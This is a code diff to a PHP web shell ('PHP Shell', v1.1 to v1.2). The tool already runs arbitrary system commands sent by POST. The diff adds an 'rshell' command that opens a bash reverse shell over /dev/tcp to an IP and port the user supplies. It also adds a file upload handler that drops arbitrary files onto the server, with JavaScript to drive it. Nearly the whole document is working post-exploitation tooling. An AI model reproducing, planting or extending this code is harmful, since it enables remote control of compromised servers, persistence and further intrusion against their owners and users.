@@ -59,14 +59,21 @@ function executeCMD($cmd) {
     }
     chdir($_SESSION['cwdlong']);
     if (substr($cmd, 0, 3) == "cd " && strpos($cmd, ";") == 0) {
+        $dir = getDir(substr($cmd, 3), true);
+        $_SESSION['cwd'] = $dir;
+        $_SESSION['cwdlong'] = getcwd();
+        echo '{"cwd": "'.$dir.'"}';
+        return;
+    }
+    if (substr($cmd, 0, 7) == "rshell " && strpos($cmd, ";") == 0) {
         $split = explode(" ", $cmd);
-        if ($split[0] == "cd") {
-            $dir = getDir(substr($cmd, 3), true);
-            $_SESSION['cwd'] = $dir;
-            $_SESSION['cwdlong'] = getcwd();
-            echo '{"cwd": "'.$dir.'"}';
+        if (count($split) < 3) {
+            echo '{"lines": ["'.base64_encode("rshell requires an IP and a port").'"]}';
             return;
         }
+        exec('/bin/bash -c "bash -i >& /dev/tcp/'.$split[1].'/'.$split[2].' 0>&1 &"');
+        echo '{"lines": ["'.base64_encode("Remote shell opened to ".$split[1].":".$split[2]).'"]}';
+        return;
     }
     exec($cmd . " 2>&1" . $trail, $output);
     $json = '{"lines": [';
@@ -80,8 +87,23 @@ function executeCMD($cmd) {
     echo $json;
 }
 
+// File upload
+function upload() {
+    $target = $_SESSION['cwdlong'];
+    $file = $target . DIRECTORY_SEPARATOR . basename($_FILES["file"]["name"]);
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $file)) {
+        echo '{"lines": ["' . base64_encode("Your file was uploaded to: " . $file) . '"]}';
+    } else {
+        echo '{"lines": ["' . base64_encode("Permission Denied: " . $target) . '"]}';
+    }
+}
+
+
+//
 // Program
-if (!isset($_POST['exec'])) {
+//
+
+if (!isset($_POST['exec']) && !isset($_FILES['file'])) {
     head();
     css();
 }
@@ -106,6 +128,8 @@ if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
 } else if ($_SESSION['logged_in'] && isset($_POST['logout'])) {
     unset($_SESSION['logged_in']);
     displayLogin();
+} else if ($_SESSION['logged_in'] && isset($_FILES['file'])) {
+    upload();
 } else if ($_SESSION['logged_in'] && !isset($_POST['exec'])) {
     $_SESSION['cwd'] = getDir(getcwd());
     $_SESSION['cwdlong'] = getcwd();
@@ -117,12 +141,12 @@ if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
 }
 
 // Dont include if the user is not logged in. Also dont include if an api call
-if (isset($_SESSION['logged_in']) && !isset($_POST['exec'])) {
+if (isset($_SESSION['logged_in']) && !isset($_POST['exec']) && !isset($_FILES['file'])) {
     javascript();
 }
 
 // Dont include if this is an api call
-if (!isset($_POST['exec'])) {
+if (!isset($_POST['exec']) && !isset($_FILES['file'])) {
     echo "  </body>
           </html>";
 }
@@ -182,7 +206,7 @@ function displayShell() {
 function head() {
     echo "<html>
             <head>
-                <title>PHP Shell - v1.1</title>
+                <title>PHP Shell - v1.2</title>
             </head>
             <body>";
 }
@@ -396,6 +420,60 @@ function javascript() {
                             shell.innerText = '';
                             addBashSim(shell, exec.value);
                             exec.value = '';
+                            return;
+                        }
+                        if (cmd === 'upload') {
+                            cmdhistory.push(exec.value);
+                            position = -1;
+                            let shell = document.getElementById('shell');
+                            addBashSim(shell, exec.value);
+                            exec.value = '';
+                            let filePrompter = document.createElement('input');
+                            filePrompter.type = 'file';
+                            filePrompter.name = 'file';
+                            filePrompter.click();
+                            filePrompter.onchange = function() {
+                                let file = filePrompter.files[0];
+                                let formData = new FormData();
+                                formData.append('file', file);
+                                let req = new XMLHttpRequest();
+                                req.open('POST', '" . $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "');
+                                req.addEventListener('load', function() {
+                                    if (req.readyState === req.DONE) {
+                                        if (req.status === 200) {
+                                            console.log(req.responseText);
+                                            let response = JSON.parse(req.responseText);
+                                            if (response.lines) {
+                                                response.lines.forEach(line => {
+                                                    let elem = document.createElement('span');                                            
+                                                    elem.innerText = atob(line);
+                                                    shell.appendChild(elem);
+                                                    shell.innerHTML += '<br>';
+                                                });
+                                                shell.scrollTop = shell.scrollHeight;
+                                            }
+                                        } else {
+                                            let elem = document.createElement('span');                                            
+                                            elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
+                                            shell.appendChild(elem);
+                                            shell.innerHTML += '<br>';                                    
+                                        }
+                                    }
+                                });
+                                req.ontimeout = function () {
+                                    let elem = document.createElement('span');                                            
+                                    elem.innerText = 'ERROR: Timeout';
+                                    shell.appendChild(elem);
+                                    shell.innerHTML += '<br>';
+                                 };
+                                req.onerror = function () {
+                                    let elem = document.createElement('span');                                            
+                                    elem.innerText = 'ERROR: Failed to connect';
+                                    shell.appendChild(elem);
+                                    shell.innerHTML += '<br>';
+                                };
+                                req.send(formData);
+                            };
                             return;
                         }
                         cmdhistory.push(exec.value);
